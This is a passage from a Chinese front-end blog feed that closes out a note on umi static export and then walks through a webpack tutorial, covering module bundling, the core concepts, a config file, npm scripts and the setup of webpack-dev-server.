class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs unknown">./dist<br>├── index.html<br>├── list.html<br>└── static<br>    ├── pages__index.5c0f5f51.async.js<br>    ├── pages__list.f940b099.async.js<br>    ├── umi.2924fdb7.js<br>    └── umi.cfe3ffab.css<br></code></pre></td></tr></table></figure><h3 id="静态化后输出到任意路径"><a href="#静态化后输出到任意路径" class="headerlink" title="静态化后输出到任意路径"></a>静态化后输出到任意路径</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-attr">exportStatic</span>: &#123;<br>    <span class="hljs-attr">htmlSuffix</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">dynamicRoot</span>: <span class="hljs-literal">true</span>,<br>  &#125;,<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>前端</tag>
      
      <tag>umi框架</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>webpack</title>
    <link href="/blog/2022/11/20/webpack/"/>
    <url>/blog/2022/11/20/webpack/</url>
    
    <content type="html"><![CDATA[<h1 id="webpack"><a href="#webpack" class="headerlink" title="webpack"></a>webpack</h1><blockquote><ol><li><a href="https://zhuanlan.zhihu.com/p/65574428">https://zhuanlan.zhihu.com/p/65574428</a></li><li><a href="https://juejin.cn/post/6844904030649614349">https://juejin.cn/post/6844904030649614349</a></li><li>新建webpack项目：<a href="https://juejin.cn/post/6844904005286494215">https://juejin.cn/post/6844904005286494215</a></li><li>无法识别webpack：<a href="https://blog.csdn.net/happyqyt/article/details/89739065">https://blog.csdn.net/happyqyt/article/details/89739065</a></li><li>webpack官方：<a href="https://webpack.docschina.org/configuration/devtool/">https://webpack.docschina.org/configuration/devtool/</a></li></ol></blockquote><h4 id="1-1-没有webpack的情况："><a href="#1-1-没有webpack的情况：" class="headerlink" title="1.1 没有webpack的情况："></a>1.1 没有webpack的情况：</h4><p>header.js：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Header</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> header = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;div&#x27;</span>);<br>    header.<span class="hljs-property">innerText</span> = <span class="hljs-string">&#x27;网页标题&#x27;</span>;<br>    webContent.<span class="hljs-title function_">appendChild</span>(header);<br>&#125;<br></code></pre></td></tr></table></figure><p>content.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Content</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> content = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;div&#x27;</span>);<br>    content.<span class="hljs-property">innerText</span> = <span class="hljs-string">&#x27;网页主体&#x27;</span>;<br>    webContent.<span class="hljs-title function_">appendChild</span>(content);<br>&#125;<br></code></pre></td></tr></table></figure><p>footer.js：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Footer</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> footer = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;div&#x27;</span>);<br>    footer.<span class="hljs-property">innerText</span> = <span class="hljs-string">&#x27;网页页脚&#x27;</span>;<br>    webContent.<span class="hljs-title function_">appendChild</span>(footer);<br>&#125;<br></code></pre></td></tr></table></figure><p>index.js：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> webContent = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;webContent&#x27;</span>);<br> <br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Header</span>();<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Content</span>();<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Footer</span>();<br></code></pre></td></tr></table></figure><p>dist.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;ie=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;webContent&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br> <br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./header.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./content.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./footer.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./index.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这样将代码模块化后，使得代码的逻辑变得清晰，更能呈现出业务场景。</p><p>但是，这种方式的模块化也存在缺点：</p><p>①页面加载速度变慢：</p><p>由于增加了js文件的数量，所以网页需要发起更多次的http请求，导致了页面加载速度变慢。</p><p>②无法直接在js代码中看出js文件之间相互的存储位置的关系，必须要通过dist.html文件才能查看。</p><p>③js文件必须按规定顺序加载：</p><p>在dist.html文件中，header.js、content.js以及footer.js文件都必须在index.js文件之前加载完毕：</p><p><img src="https://pic1.zhimg.com/80/v2-0df3230ef4b30ab06ca7436b683a7090_720w.webp" alt="img"></p><p>假如我们把header.js文件，放在index.js文件后面进行加载：</p><p><img src="https://pic3.zhimg.com/80/v2-57193acea19b5a9b4a8e8a3aff35ce5a_720w.webp" alt="img"></p><p>网页的控制台就会报错。</p><h4 id="1-2-使用webpack打包的情况"><a href="#1-2-使用webpack打包的情况" class="headerlink" title="1.2 使用webpack打包的情况"></a>1.2 使用webpack打包的情况</h4><p>为了解决上面那种模块化方式存在的缺点，我们依据ES module的规则改写一点代码，然后结合webpack来解决。</p><p>首先，我们来看改写后的代码：</p><p>header.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Header</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> webContent = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;webContent&#x27;</span>);<br>    <span class="hljs-keyword">var</span> header = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;div&#x27;</span>);<br>    header.<span class="hljs-property">innerText</span> = <span class="hljs-string">&#x27;网页标题&#x27;</span>;<br>    webContent.<span class="hljs-title function_">appendChild</span>(header);<br>&#125;<br> <br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">Header</span>;<br></code></pre></td></tr></table></figure><p>content.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Content</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> webContent = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;webContent&#x27;</span>);<br>    <span class="hljs-keyword">var</span> content = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;div&#x27;</span>);<br>    content.<span class="hljs-property">innerText</span> = <span class="hljs-string">&#x27;网页主体&#x27;</span>;<br>    webContent.<span class="hljs-title function_">appendChild</span>(content);<br>&#125;<br> <br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">Content</span>;<br></code></pre></td></tr></table></figure><p>footer.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Footer</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> webContent = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;webContent&#x27;</span>);<br>    <span class="hljs-keyword">var</span> footer = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;div&#x27;</span>);<br>    footer.<span class="hljs-property">innerText</span> = <span class="hljs-string">&#x27;网页页脚&#x27;</span>;<br>    webContent.<span class="hljs-title function_">appendChild</span>(footer);<br>&#125;<br> <br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">Footer</span>;<br></code></pre></td></tr></table></figure><p>index.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Header</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./header.js&#x27;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Content</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./content.js&#x27;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Footer</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./footer.js&#x27;</span>;<br> <br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Header</span>();<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Content</span>();<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Footer</span>();<br></code></pre></td></tr></table></figure><p>dist.html:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;ie=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;webContent&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br> <br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./dist/main.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>接下来，进入到上面这些文件的根目录，我这里是进入到e:\webpack-demo，然后初始化npm环境（注意：做这些操作之前必须要先安装node环境，可以参考这篇文章：</p><p><a href="https://link.zhihu.com/?target=https://www.npmjs.com.cn/getting-started/installing-node/%EF%BC%89%EF%BC%9A">https://www.npmjs.com.cn/getting-started/installing-node/）：www.npmjs.com.cn/getting-started/installing-node/%EF%BC%89%EF%BC%9A</a></p><p><img src="https://pic3.zhimg.com/80/v2-a00645e76758c8afa04f4f16bde731e6_720w.webp" alt="img"></p><p>接下来，一直回车就好。</p><p>然后，安装webpack:</p><p><img src="https://pic2.zhimg.com/80/v2-023b4ee85a09368e9094de33ac87d255_720w.webp" alt="img"></p><p>最后，运行npx webpack命令（Node 8.2+ 版本提供的 npx 命令，可以运行在初始安装的 webpack 包(package)的 <strong>webpack</strong> 二进制文件，就是可以调用webpack中的webpack二进制文件程序）：</p><p><img src="https://pic4.zhimg.com/80/v2-994a8b8ca95e19b1d6148488b271a907_720w.webp" alt="img"></p><p>此时，会发现根目录中出现了一个新的文件夹：</p><p><img src="https://pic3.zhimg.com/80/v2-823b4204e121b4270006c43d179a99aa_720w.webp" alt="img"></p><p>查看dist文件夹中的内容，可以发现有一个main.js文件，其实这个main.js文件是webpack将index.js、header.js、content.js、footer.js打包在一起的一个文件。</p><p>用浏览器直接打开dist.html文件，可以发现和原先的模块化方法得到相同的结果：</p><p><img src="https://pic3.zhimg.com/80/v2-d0811a49a974c32c1c400711a297dcda_720w.webp" alt="img"></p><h4 id="1-3-webpack是什么"><a href="#1-3-webpack是什么" class="headerlink" title="1.3 webpack是什么"></a>1.3 webpack是什么</h4><p>webpack是一个打包工具，他的宗旨是一切静态资源皆可打包。有人就会问为什么要webpack？webpack是现代前端技术的基石，常规的开发方式，比如jquery,html,css静态网页开发已经落后了。现在是MVVM的时代，数据驱动界面。webpack它做的事情是，分析你的项目结构，找到JavaScript模块以及其它的一些浏览器不能直接运行的拓展语言（Scss，TypeScript等），并将其打包为合适的格式以供浏览器使用。</p><h4 id="1-4-webpack核心概念"><a href="#1-4-webpack核心概念" class="headerlink" title="1.4 webpack核心概念"></a>1.4 webpack核心概念</h4><p><strong>1、Entry（入口）：</strong>指示 webpack 应该使用哪个模块，来作为构建其内部依赖图的开始。进入入口起点后，webpack 会找出有哪些模块和库是入口起点（直接和间接）依赖的。</p><p><strong>2、Output（出口）：</strong>告诉 webpack 在哪里输出它所创建的结果文件，以及如何命名这些文件，默认值为.&#x2F;dist。</p><p><strong>3、Loader（模块转换器）：</strong>将所有类型的文件转换为 webpack 能够处理的有效模块，然后你就可以利用 webpack 的打包能力，对它们进行处理。</p><p><strong>4、Plugins（插件）：</strong>在 Webpack 构建流程中的特定时机注入扩展逻辑来改变构建结果或做你想要的事情。</p><p><strong>5、Module(模块)：</strong>开发者将程序分解成离散功能块，并称之为模块，</p><p>在webpack里一个模块对应着一个文件，webpack会从配置的 Entry 开始递归找出所有依赖的模块。</p><h4 id="1-5-webpack执行流程"><a href="#1-5-webpack执行流程" class="headerlink" title="1.5 webpack执行流程"></a>1.5 webpack执行流程</h4><p>webpack启动后会在entry里配置的module开始递归解析entry所依赖的所有module，每找到一个module, 就会根据配置的loader去找相应的转换规则，对module进行转换后在解析当前module所依赖的module，这些模块会以entry为分组，一个entry和所有相依赖的module也就是一个chunk，最后webpack会把所有chunk转换成文件输出，在整个流程中webpack会在恰当的时机执行plugin的逻辑</p><h4 id="1-6-webpack简单打包案例"><a href="#1-6-webpack简单打包案例" class="headerlink" title="1.6 webpack简单打包案例"></a>1.6 webpack简单打包案例</h4><ol><li>准备工作</li></ol><p>建一个空文件夹用于创建项目， 如下我在D盘创建了一个名为webpack_demo的文件夹，使用终端进入文件夹， 使用npm init 命令初始化一个package.json文件。</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2019/12/24/16f374c2ea3e67e4~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="img"></p><p>输入这个命令后，终端会问你一系列诸如项目名称，项目描述，作者等信息，不过如果你不打算发布这个模块，直接一路回车就好。（也可以使用<code>npm init -y</code>这个命令来一次生成package.json文件，这样终端不会询问你问题）。</p><ol start="2"><li>安装webpack</li></ol><p>接下来在命令行中输入以下命令安装webpack，如果你想一步到位的话，就把全局webpack和本地项目webpack全都先装了，因为后面一些模块会用到。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">npm install webpack --global                <span class="hljs-regexp">//</span> 安装全局webpack命令<br>npm install webpack webpack-cli --save-dev  <span class="hljs-regexp">//</span> 安装本地项目模块<br><br><span class="hljs-regexp">//</span> install    可简写为i,<br><span class="hljs-regexp">//</span> --global   可简写为-g<br><span class="hljs-regexp">//</span> --save     可简写为-S<br><span class="hljs-regexp">//</span> --save-dev 可简写为-D复制代码<br></code></pre></td></tr></table></figure><ol start="3"><li>新建文件</li></ol><p>在webpack_demo文件夹下新建两个文件夹，分别为src文件夹和dist文件夹，接着在src文件夹下新增index.js文件和hello.js文件，在dist文件夹下新增index.html文件。此时项目结构如下：</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2019/12/24/16f374c2eb7d555a~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="img"></p><p>在hello.js中导出一个模块</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// hello.js </span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>   <span class="hljs-keyword">let</span> hello = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;div&#x27;</span>);<br>   hello.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">&quot;hello xxx!&quot;</span>;<br>   <span class="hljs-keyword">return</span> hello;<br> &#125;;<br></code></pre></td></tr></table></figure><p>在index.js中引入这个hello.js模块</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-comment">// index.js</span><br><span class="hljs-keyword">const</span> hello = require(<span class="hljs-string">&#x27;./hello.js&#x27;</span>);<br><span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&quot;#root&quot;</span>).appendChild(hello());<br></code></pre></td></tr></table></figure><p>在index.html下引入打包后的js文件bundle.js</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Webpack demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;root&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;bundle.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>   <span class="hljs-comment">&lt;!--这是打包之后的js文件，我们暂时命名为bundle.js--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="4"><li>进行打包</li></ol><p>在终端输入如下命令进行打包</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> webpack全局安装的情况下，output后面的是打包后的文件路径，bundle.js为打包后的js文件名<br><br>webpack src<span class="hljs-regexp">/index.js --output dist/</span>bundle.js  <br><br><span class="hljs-regexp">//</span> --output可简写为-o<br><span class="hljs-regexp">//</span> 上述命令相当于把src文件夹下的index.js文件打包到dist文件夹下的bundle.js，这样就生成了打包后的文件供index.html引入<br></code></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2019/12/24/16f374c2eca103e8~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="img"></p><p>可以看出webpack同时编译了index.js和hello.js，因为index.js文件引入了hello.js模块，现在打开index.html看看结果</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2019/12/24/16f374c2ee62bb72~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="img"></p><p>我们已经成功使用webpack进行打包，这时小伙伴要说了，每次都在终端中输入这么长的命令，感觉好烦啊，接下来学习通过配置文件来使用webpack。</p><ol start="5"><li>通过配置文件来使用webpack</li></ol><p>在当前项目的根目录下新建一个配置文件webpack.config.js，我们写下如下简单配置代码，目前只涉及入口配置（相当于我们的index.js，从它开始打包）和出口配置（相当于我们打包生成的bundle.js）。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> webpack.config.js<br>const path = require(<span class="hljs-string">&#x27;path&#x27;</span>);<br>module.exports = &#123;<br>    entry: path.join(__dirname, <span class="hljs-string">&quot;/src/index.js&quot;</span>), <span class="hljs-regexp">//</span> 入口文件<br>    output: &#123;<br>        path: path.join( __dirname, <span class="hljs-string">&quot;/dist&quot;</span>), <span class="hljs-regexp">//</span> 打包后的文件存放的地方 <br>        filename: <span class="hljs-string">&quot;bundle.js&quot;</span> <span class="hljs-regexp">//</span> 打包后输出文件的文件名<br>    &#125;<br>&#125;<br><br><span class="hljs-regexp">//</span> path.join的功能是拼接路径片段<br><span class="hljs-regexp">//</span> __dirname是node.js中的一个全局变量，它指向当前执行脚本所在的目录，即D:\webpack_demo<br></code></pre></td></tr></table></figure><p>有了这个配置文件，我们只需在终端中运行webpack命令就可进行打包，这条命令会自动引用webpack.config.js文件中的配置选项</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2019/12/24/16f374c2edcc40d3~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="img"></p><ol start="6"><li>package.json文件中自定义脚本命令</li></ol><p>Node项目一般都有一个package.json文件，该文件用于描述当前项目，其中有一个scripts属性，该属性可以自定义脚本命令，例如我们运行的打包命令，那么可以在scripts里添加自定义脚本为：</p><p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2019/12/24/16f374c2f40cd7cf~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="img"></p><p>之后就可以使用npm run build来运行该脚本命令，这样有什么好处呢？如果命令行很短，好处当然不明显了，但是如何命令行很长呢？那么我们可以在这里添加每次都需要执行的命令，配置了scripts后， npm run key值相当于在终端运行了value值</p><h4 id="1-7-构建本地服务"><a href="#1-7-构建本地服务" class="headerlink" title="1.7 构建本地服务"></a>1.7 构建本地服务</h4><p>上面案例我们是通过打开本地HTML文件来查看页面的，vue，react框架时都是运行在本地服务器上的，那我们能不能也改成那样呢？接下来学习如何构建本地服务</p><ol><li>webpack-dev-server配置本地服务器</li></ol><p>Webpack提供了一个可选的本地开发服务器，这个本地服务器基于node.js构建，它是一个单独的组件，在webpack中进行配置之前需要单独安装它作为项目依赖：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">npm install webpack-dev-<span class="hljs-keyword">server</span> -D<br></code></pre></td></tr></table></figure><ol start="2"><li>devServer配置项</li></ol><ul><li><strong>port：</strong>指定了开启服务器的端口号，默认为8080</li><li><strong>host：</strong>配置 DevServer的服务器监听地址，默认为 127.0.0.1</li><li><strong>headers：</strong>该配置项可以在HTTP响应中注入一些HTTP响应头。例如：</li></ul><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">headers: &#123;<br>  